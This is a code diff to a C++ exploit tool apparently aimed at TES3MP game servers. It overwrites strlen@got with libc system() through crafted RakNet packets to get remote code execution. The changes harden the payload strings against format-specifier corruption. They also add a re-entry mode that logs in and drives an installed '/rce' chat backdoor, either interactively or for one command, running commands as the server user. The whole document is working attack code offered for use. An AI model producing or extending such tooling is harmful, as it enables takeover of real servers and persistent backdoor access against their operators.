@@ -150,6 +150,17 @@ static void vlog(const char *f, ...) { if (!g_verbose) return; va_list a; va_sta
 static void snd(Cli &c, BitStream &bs) { c.peer->Send(&bs, HIGH_PRIORITY, RELIABLE_ORDERED, 0, c.srv, false); }
 static void hdr(Cli &c, BitStream &bs, unsigned char id) { bs.Write(id); RakNetGUID g = c.peer->GetMyGUID(); bs.Write(g); }
 
+// Build every RakString from bytes, never from the constructor.
+//
+// RakString(const char *format, ...) is printf-style: it forwards to _vsnprintf(buf, 512, str, ap)
+// (RakString.cpp, Assign(const char*, va_list)). So a '%' anywhere in the data is read as a conversion
+// specifier and vsnprintf consumes a vararg that was never passed, i.e. CWE-134 against ourselves. This is
+// not hypothetical in either direction: shell payloads contain '%' routinely ("printf %s ..."), and the raw
+// pointer bytes we serialize are '%' whenever a byte happens to be 0x25, which silently corrupts roughly one
+// run in forty. AppendBytes is the plain, non-format path and takes an explicit length.
+static RakString rstr(const char *s, size_t n) { RakString r; if (s && n) r.AppendBytes(s, (unsigned)n); return r; }
+static RakString rstr(const char *s) { return rstr(s, s ? strlen(s) : 0); }
+
 static bool connectTo(Cli &c, const char *bind)
 {
     c.peer = RakPeerInterface::GetInstance();
@@ -204,15 +215,15 @@ static void handshake(Cli &c, const char *name)
     { BitStream bs; hdr(c, bs, ID_GAME_PREINIT); uint32_t n = g_files.size(); bs.Write(n);
       struct NAS { uint32_t h, s; };
       for (auto &f : g_files) { NAS q{1, (uint32_t)f.first.size()}; bs.Write(q); }
-      for (auto &f : g_files) { RakString rs(f.first.c_str()); bs.Write(rs); unsigned h = f.second; bs.Write(h); }
+      for (auto &f : g_files) { RakString rs = rstr(f.first.c_str()); bs.Write(rs); unsigned h = f.second; bs.Write(h); }
       snd(c, bs); } usleep(250000);
     { BitStream bs; hdr(c, bs, ID_SYSTEM_HANDSHAKE);
-      RakString pn(name), pw(g_srvpass);
+      RakString pn = rstr(name), pw = rstr(g_srvpass);
       RakString::SerializeCompressed(pn.C_String(), &bs);
       RakString::SerializeCompressed(pw.C_String(), &bs);   // <-- the server password goes here
       snd(c, bs); } usleep(250000);
     { BitStream bs; hdr(c, bs, ID_PLAYER_BASEINFO);
-      RakString nm(name), m(""), r("Dark Elf"), h(""), hd("");
+      RakString nm = rstr(name), m(""), r("Dark Elf"), h(""), hd("");
       RakString::SerializeCompressed(nm.C_String(), &bs); RakString::SerializeCompressed(m.C_String(), &bs);
       RakString::SerializeCompressed(r.C_String(), &bs);  RakString::SerializeCompressed(h.C_String(), &bs);
       RakString::SerializeCompressed(hd.C_String(), &bs);
@@ -234,7 +245,7 @@ static void loadCell(Cli &c, const char *cn)
     BitStream bs; hdr(c, bs, ID_PLAYER_CELL_STATE);
     uint32_t cnt = 1; bs.Write(cnt); int t = 0; bs.Write(t);
     D12 d{1, 0, 0}; bs.WriteCompressed(d);
-    RakString rc(cn); RakString::SerializeCompressed(rc.C_String(), &bs);
+    RakString rc = rstr(cn); RakString::SerializeCompressed(rc.C_String(), &bs);
     snd(c, bs); usleep(300000);
 }
 
@@ -256,7 +267,7 @@ static void guiRespond(Cli &c, int id, int type, const char *data)
     BitStream bs; hdr(c, bs, ID_GUI_MESSAGEBOX);
     bs.Write(id); bs.Write(type);                                        // echo the server's dialog id (avoids the banlist trap)
     RakString label(""); bs.Write(label);                               // RW(label, send)
-    RakString d(data); RakString::SerializeCompressed(d.C_String(), &bs); // RW(data, send, true) -> the password
+    RakString d = rstr(data); RakString::SerializeCompressed(d.C_String(), &bs); // RW(data, send, true) -> the password
     RakString note(""); bs.Write(note);                                 // RW(note, send)
     snd(c, bs); usleep(120000);
 }
@@ -277,7 +288,17 @@ static bool readChat(Cli &c, int ms, std::string &out)
     return got;
 }
 
-static int runShell(const char *name, const char *acctPass)
+// Re-entry path. Deliberately shares nothing with the exploit: this is an ordinary client that
+// connects, registers/logs in an account, and uses the already-installed command hook. It touches
+// no server memory, so it works after a restart and can be run repeatedly without re-exploiting.
+//
+// It does need an ACCOUNT, unlike the exploit chain, because CoreScripts gates OnPlayerSendMessage
+// on IsLoggedIn() (eventHandler.lua:830) and command hooks dispatch from that callback. Registering
+// leaves a player file on the target (data/player/<name>.json) - state the exploit path never creates.
+//
+// oneShot != 0 runs a single command and exits, so the deploy tooling can verify itself without
+// driving stdin.
+static int runShell(const char *name, const char *acctPass, const char *oneShot)
 {
     Cli A{};
     if (!connectTo(A, "")) { printf("[!] could not connect (server password / reachability)\n"); return 1; }
@@ -305,6 +326,22 @@ static int runShell(const char *name, const char *acctPass)
     }
     if (!authed) { printf("[!] login did not complete. Wrong password for an existing account, or the server rejected it.\n"); return 1; }
     std::string banner; readChat(A, 500, banner);
+
+    if (oneShot) {
+        std::string out;
+        sendChatStr(A, std::string("/rce ") + oneShot);
+        readChat(A, 3000, out);
+        // Distinguish "hook ran" from "hook absent". CoreScripts answers an unknown command with its
+        // own chat line, which is non-empty, so an emptiness check alone reports success on a clean
+        // server. Caught by running this against a server whose hook had just been removed.
+        if (out.empty()) { printf("[!] no response - server did not answer\n"); return 1; }
+        if (out.find("Not a valid command") != std::string::npos) {
+            printf("[!] hook NOT present: server rejected /rce as an unknown command\n"); return 1;
+        }
+        fputs(out.c_str(), stdout); if (out.back() != '\n') printf("\n");
+        return 0;
+    }
+
     printf("[*] shell ready. commands run as the server user via the /rce backdoor. ctrl-D to exit.\n\n");
     char line[8192];
     for (;;) {
@@ -375,7 +412,7 @@ static void cellChange(Cli &c, const char *cn)
 {
     BitStream bs; hdr(c, bs, ID_PLAYER_CELL_CHANGE);
     CellData12 md{0, 0, 0}; bs.WriteCompressed(md);
-    RakString cs(cn); RakString::SerializeCompressed(cs.C_String(), &bs);
+    RakString cs = rstr(cn); RakString::SerializeCompressed(cs.C_String(), &bs);
     Pos3 pp{{0, 0, 0}}; bs.WriteCompressed(pp);
     bool region = false; bs.Write(region);
     snd(c, bs); usleep(200000);
@@ -486,6 +523,14 @@ static void usage(const char *a0)
       "  -C, --cell <name>           cell to meet in (default: ExploitCell)\n"
       "  -p, --probe                 connect both clients to POSTLOADED, report reachability, and STOP.\n"
       "                              Touches no server memory: safe to run against a live server.\n"
+      "  -s, --shell                 RE-ENTRY mode. Does NOT exploit anything: connects as an ordinary\n"
+      "                              client and drives a command hook that is ALREADY installed. Use\n"
+      "                              after a server restart, or to avoid re-running the chain. With -c\n"
+      "                              it runs one command and exits; otherwise it is interactive.\n"
+      "                              Unlike the exploit path this DOES need an account, because\n"
+      "                              CoreScripts gates chat on IsLoggedIn(); it registers on first use\n"
+      "                              and so leaves data/player/<name>.json on the target.\n"
+      "  -A, --account-pass <pw>     account password for -s (default: rce-poc-pw-1)\n"
       "  -B, --server-bin <path>     read the vtable/strlen@got/malloc@got RVAs from a copy of the TARGET's\n"
       "                              tes3mp-server.x86_64. Needed only if the target is not the stock 0.8.1.\n"
       "  -L, --libc <path>           read malloc/system offsets from a copy of the TARGET's libc.so.6.\n"
@@ -546,9 +591,13 @@ int main(int argc, char **argv)
     if (optind < argc) g_port = atoi(argv[optind++]);
 
     if (shellMode) {
-        printf("[*] shell client -> %s:%d (account '%s'). Backdoor must already be installed.\n", g_host, g_port, nameBase);
+        int cmdGiven = 0;
+        for (int i = 1; i < argc; i++)
+            if (!strcmp(argv[i], "-c") || !strcmp(argv[i], "--command")) cmdGiven = 1;
+        printf("[*] re-entry client -> %s:%d (account '%s'). Hook must already be installed; nothing is exploited.\n",
+               g_host, g_port, nameBase);
         fingerprint();
-        return runShell(nameBase, acctPass);
+        return runShell(nameBase, acctPass, cmdGiven ? cmd : 0);
     }
 
     if (serverBin) {
@@ -668,10 +717,10 @@ int main(int argc, char **argv)
       bs.Write(false); uint32_t two = 2; bs.Write(two);
       int i7 = 7; bs.Write(i7);
       uint64_t s6 = sys & 0xffffffffffffULL; char sb[7]; memcpy(sb, &s6, 6); sb[6] = 0;
-      RakString r7(sb); RakString::SerializeCompressed(r7.C_String(), &bs);
+      RakString r7 = rstr(sb); RakString::SerializeCompressed(r7.C_String(), &bs);
       int one = 1, zero = 0; bs.Write(one); bs.Write(zero); bs.Write(zero);
       int i5 = 5; bs.Write(i5);
-      RakString r5(cmd); RakString::SerializeCompressed(r5.C_String(), &bs);
+      RakString r5 = rstr(cmd); RakString::SerializeCompressed(r5.C_String(), &bs);
       bs.Write(one); bs.Write(zero); bs.Write(zero);
       snd(A, bs); }
     printf("[+] trigger sent: strlen@got <- system, then strlen(\"%s\")\n", cmd);
